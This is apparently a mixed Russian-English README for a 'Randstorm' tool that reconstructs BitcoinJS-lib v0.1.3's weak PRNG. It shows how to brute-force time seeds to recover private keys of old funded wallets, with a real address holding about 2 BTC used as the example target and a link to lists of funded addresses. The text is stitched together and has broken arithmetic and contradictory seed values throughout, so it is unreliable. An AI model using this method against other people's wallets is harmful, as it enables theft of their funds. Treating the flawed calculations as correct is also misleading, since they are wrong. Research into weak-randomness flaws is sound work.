В папке coinpunk 💻 Пример кода для Node.js v22.20.0
Ниже приведён схематический код, который воспроизводит уязвимый ГПСЧ и позволяет перебирать ключи для заданного диапазона времени. Для простоты он сфокусирован на переборе только по времени (SEED_TIME_VALUE), что является основным вектором атаки Randstorm.

Вот пример файла package.json, который описывает их. Для его создания выполните в терминале команду npm init -y в папке с вашим проектом: <br>

```javascript
	{
  "name": "randstorm-recovery",
  "version": "1.0.0",
  "description": "Восстановление ключей через уязвимость Randstorm",
  "main": "randstorm-recovery.js",
  "dependencies": {
    "bigi": "^1.4.2",
    "bitcoinjs-lib": "^5.2.0",
    "bs58": "^5.0.0"
  },
  "scripts": {
    "start": "node randstorm-recovery.js"
  }
}
  ```
🛠 Как установить
Сохраните код package.json в папке вашего проекта.

В терминале, находясь в этой папке, выполните команду:

```javascript
	npm install
  ```


🚀 Особенности этого кода:
Точность до миллисекунды - Перебирает каждую миллисекунду в диапазоне

Детерминированный Math.random - Используется алгоритм для точного воспроизведения оригинальной уязвимости

Оптимизированная производительность:

Быстрая проверка по префиксу адреса

Пакетная обработка для снижения нагрузки на память

Регулярный вывод прогресса со скоростью перебора

Гибкий поиск:

preciseSearch() - полный перебор с шагом 1 мс

narrowSearch() - поиск в окне вокруг предполагаемой даты

Чистый вывод результатов с детальной информацией

📊 Оценка времени выполнения:
Диапазон	Количество итераций	При скорости 100 итераций/сек	При скорости 1000 итераций/сек
1 день	86,400,000	10 дней	1 день
1 неделя	604,800,000	70 дней	7 дней
1 месяц	2,592,000,000	300 дней	30 дней
2011-2015	126,144,000,000	40 лет	4 года
💡 Рекомендации:
Сначала тестируйте на маленьком диапазоне (например, 1 час)

Используйте многопоточность для ускорения поиска

По возможности сузьте диапазон на основе дополнительной информации

Рассмотрите использование GPU для криптографических операций










Between 2010 and 2015, many exchanges and websites relied on BitcoinJS-lib v0.1.3 for Bitcoin wallet generation. The issue was that many browsers didn't use window.crypto.random, which lead to entropy being collected from Math.random(). <br>

```javascript
	if (this.pool == null) {  // Check if the pool is not already initialized
		this.poolSize = 256;
		this.pool = new Array(this.poolSize);  // Create an array to store random values
		this.pptr = 0;  // Initialize the pool pointer to 0
		var t;  // Declare a variable to store temporary random values

		// Fill the pool with random values
		while (this.pptr < this.poolSize) {
			t = Math.floor(65536 * Math.random());  // Generate a random 16-bit value
			this.pool[this.pptr++] = t >>> 8;  // Store the high byte of the 16-bit value
			this.pool[this.pptr++] = t & 255;  // Store the low byte of the 16-bit value
			}

		this.pptr = 0;  // Reset the pool pointer to 0
		this.seedTime();  // Call a function (not provided) to seed the random values based on time
		}
  ```
The provided JavaScript code enters a loop where it generates random 16-bit values (t) and fills the array by storing the high and low bytes of each 16-bit value consecutively. This process continues until the pool is full. After filling the pool, the pointer is reset to 0, and a function seedTime() is called to further seed the random values based on time. In summary, this code creates and populates a pool of 256 'random' values using a simple algorithm based on random number generation and bitwise operations.

```javascript
t = Math.floor(65536 * Math.random());
```
Math.random() generates a pseudo-random floating-point number in the range 0 and 1: 0.5532989501953125

Scaled value: 0.5532989501953125 * 65536 ≈ 36222.405517578125 = 36222

```javascript
this.pool[this.pptr++] = t >>> 8;  // Store the high byte of the 16-bit value
this.pool[this.pptr++] = t & 255;  // Store the low byte of the 16-bit value
 ```
Subsequently, the code separates this 16-bit integer into two 8-bit values (high byte and low byte) using bitwise operations.

Original value: 36222 (16-bit binary representation: 1000110110001110

High byte: 0000000010001101 =  13
Low byte:  000011100011110 =  222

Therefore, for the value 36222, the high byte is 13, and the low byte is 222. These values are then stored in a pool of 256 values like this: 

```bash
Current Pool : [
  13, 222,  70, 233, 237, 155, 103,  43, 176,   6, 103,  47,
  194, 180,  82, 147,  36,  24, 126, 132,  26, 247, 178, 161,
  102, 171,  42, 173, 137, 121, 101,  29,  19, 107, 112, 132,
  198,  71,  11,  44, 244, 154,  32,   0,  99, 226,  73, 154,
  197,  98,  70, 239,  50,  15, 239, 209,  68,  60, 116, 121,
  146,  13, 195, 112, 222, 166, 167,  66, 220, 156, 178,  51,
   14, 250, 252,  44, 104,  53, 114, 146,  50,  37, 217, 242,
  175,  19, 180, 145,  96,  31,  53,  35, 226, 203,  86,  25,
   69,  51, 207,  30,
  ... 156 more items
]
```
##  XOR Operations

This function is used to mix the bits of the input integer x (the seed time) into the pool array, providing a way to seed the generator or introduce entropy into the system for generating pseudorandom numbers. The XOR operation helps ensure that each bit of the input has an effect on the state of the generator.

```javascript
this.seedInt = function (x) {
        this.pool[this.pptr++] ^= x & 255;
        this.pool[this.pptr++] ^= (x >> 8) & 255;
        this.pool[this.pptr++] ^= (x >> 16) & 255;
        this.pool[this.pptr++] ^= (x >> 24) & 255;
        if (this.pptr >= this.poolSize) this.pptr -= this.poolSize;
    };
```
```bash
After XORs... New pool:  [
   85,  15,  17, 189, 237, 155, 103,  43, 176,   6, 103,  47,
  194, 180,  82, 147,  36,  24, 126, 132,  26, 247, 178, 161,
  102, 171,  42, 173, 137, 121, 101,  29,  19, 107, 112, 132,
  198,  71,  11,  44, 244, 154,  32,   0,  99, 226,  73, 154,
  197,  98,  70, 239,  50,  15, 239, 209,  68,  60, 116, 121,
  146,  13, 195, 112, 222, 166, 167,  66, 220, 156, 178,  51,
   14, 250, 252,  44, 104,  53, 114, 146,  50,  37, 217, 242,
  175,  19, 180, 145,  96,  31,  53,  35, 226, 203,  86,  25,
   69,  51, 207,  30,
  ... 156 more items
]
```
##  Arcfour - RC4 Stream Cipher Encoding 

In order to generate bytes the algorithm uses the pool of 256 values. These values are run through the [Arcfour](https://github.com/kyledrake/coinpunk/blob/master/lib/bitcoinjs/jsbn/prng4.js) cipher to randomize it futher using the seed time. The seed time is used to randomize the pool. But sice we are using a set seed, for example time = 1395038931000, we can use the seed to decrypt the cypher. 

```javascript
    this.getByte = function () {
        if (this.state == null) {
            this.seedTime();
            this.state = this.ArcFour(); // <---- Here is where ArcFour() is called 
            this.state.init(this.pool);
            for (this.pptr = 0; this.pptr < this.pool.length; ++this.pptr)
                this.pool[this.pptr] = 0;
            this.pptr = 0;
        }
        return this.state.next();
    };
```
After Arcfour runs, the new pool is used: 
```bash
Final Pool: [
   51, 144, 239, 168, 173, 187, 209,  30, 108, 107,   5, 235,
  194,  94,  15, 197,  60,  82, 193, 225, 198, 123, 139, 113,
   68,  72,  10, 129,  66,  88,  17, 224,  58, 132, 158, 231,
    9, 252,   9, 192,  38, 237, 167, 155,  91,  72, 124, 166,
  201,  81, 233,  35,  20, 219,  67, 116, 170,  28, 134,  64,
   85,  14,  61, 103, 147,   3, 203,  27, 156, 166, 110, 229,
   14,  25,   9, 150, 172, 237, 188, 239, 249, 166, 212, 161,
  190, 205, 141, 164,  26, 197,  90, 122, 124, 182,  32,  80,
   56, 191, 152, 165,
  ... 156 more items
]
```
##  Math.random() predictability 

Using [v8-randomness-predictor](https://github.com/PwnFunction/v8-randomness-predictor) or [v8_rand_buster](https://github.com/d0nutptr/v8_rand_buster/tree/master) to predict Math.random values. 

```bash
Sequence = [0.6297969575631002, 0.6074412953668151, 0.9919811223107806, 0.48870040262493863, 0.4398739265503919]

Next Sequence: 0.3283496320042738

Updated Sequence: [0.6074412953668151, 0.9919811223107806, 0.48870040262493863, 0.4398739265503919, 0.3283496320042738]

Next Sequence: 0.37620797979266385

Updated Sequence: [0.9919811223107806, 0.48870040262493863, 0.4398739265503919, 0.3283496320042738, 0.37620797979266385]

Next Sequence: 0.7982242070609398
```

##  Coinpunk

One of the projects that used the vulnerable code for several years was Coinpunk. This allows you generate a wallet using the coinpunk-0.1.0 and outputs the Math.random() values that are generated during wallet creation. You can set SEED_TIME_VALUE = 1294200190000 in the .js file to change the current time it's seed at. 

![https://github.com/RandstormBTC/randstorm/tree/main/coinpunk](https://raw.githubusercontent.com/RandstormBTC/randstorm/coinpunk/coinpunk/coinpunk.png)

## Vulnerable Wallets

This vulnerability is only for wallets that were created using [BitcoinJS-lib v0.1.3](https://github.com/bitcoinjs/bitcoinjs-lib/releases/tag/0.1.3). Since we can't determine when the wallet was generated or even if the wallet was generated using BitcoinJS-lib v0.1.3, it makes things very difficult. 

We can examine when the first transaction took place using the blockchain. Using Get_First_Transaction.py we can get the first transaction date using a free API call on [btcscan.org](https://btcscan.org/). If the address was generated on December 24, 2012, 2:44:56 AM, then using the [Unix epoch time](https://www.epochconverter.com/) we can see that the seed = 55793394904000. This is the Unix epoch time in milliseconds. 

```bash
Address: 1NUhcfvRthmvrHf1PAJKe5uEzBGK44ASBD
First Transaction: 2014-03-16 23:48:51 GMT -7
Current Balance: 1.9999 BTC
```
Convert the date 2014-03-16 23:48:51 GMT -7 to Unix epoch time in linux with command:

```bash
date -d "2014-03-16 23:48:51 GMT -7" +"%s" | awk '{print $1 * 1000}'
```
1395038931000

Now, get the date from whatever time period you want to try before March 3, 2014.

March 1, 2014 = 1393635661000

1395042082000 - 1393635661000 = 1.4 Billion Seeds

## Generate Seeds

Using the implementation of SecureRandom(), set the seed to March 1, 2014 = 1393635661000 and generate keys incrementally until the date of the first transaction:

Seed: 1310691661000 <br>
Hex: 6ad2d763712eae6428e2922d7181f92fb70d0e564d1dd38dd0aa9b34b844c0cb <br>
P2PKH: 1JbryLqejpB17zLDNspRyJwjL5rjXW7gyw<br>
...
## Download Addressess 
All funded Bitcoin addresses can be downloaded at:

http://addresses.loyce.club/

## Disclaimer
This software is for education purporses only and should not be configured and used to find (Bitcoin/Altcoin) address hash (RIPEMD-160) collisions and use (steal) credit from third-party (Bitcoin/Altcoin) addresses. This mode might be allowed to recover lost private keys of your own public addresses only.

Another mostly legal use case is a check if the (Bitcoin/Altcoin) addresses hash (RIPEMD-160) is already in use to prevent yourself from a known hash (RIPEMD-160) collision and double use. Some configurations are not allowed in some countries.

## Questions and Comments

Please feel free to share any questions. This is a work in progress and replicating the exact SecureRandom() function in python from Javascript has not been very easy. There still may be some issues...

## Contributors 

Special thanks to ChatGPT and DeepSeek Coder for the help. 

## Sources:

 <https://www.unciphered.com/blog/randstorm-you-cant-patch-a-house-of-cards>

 <https://jandemooij.nl/blog/math-random-and-32-bit-precision/>

 <https://medium.com/@betable/tifu-by-using-math-random-f1c308c4fd9d>

<https://security.stackexchange.com/questions/84906/predicting-math-random-numbers>

<https://lwn.net/Articles/666407/>

<https://ifsec.blogspot.com/2012/09/of-html5-security-cross-domain.html>

<https://github.com/PwnFunction/v8-randomness-predictor/tree/main>

## Donate:
BTC: bc1q2rqz0mzwxdm0umhlllsyd5rt30uh8kswhqcnqp
